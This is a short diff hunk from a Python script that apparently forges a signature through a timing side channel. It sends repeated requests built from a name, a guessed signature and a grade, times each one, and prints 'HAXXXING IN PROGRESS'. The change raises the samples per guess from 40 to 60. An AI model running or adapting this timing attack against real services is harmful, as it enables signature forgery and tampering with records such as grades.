@@ -30,7 +30,7 @@ for i in range(4, 20):
         curTime  = 0
         print("HAXXXING IN PROGRESS: ","".join(testsig), "\r",end='')
         urllib.request.urlopen(buildurl(name,testsig,grade), context=ctx)
-        for z in range(0,40):
+        for z in range(0,60):
             start = time.clock()
             #urllib.urlopen(buildurl(name,testsig,grade), context=ctx).read()
             #print(buildurl(name,testsig,grade))
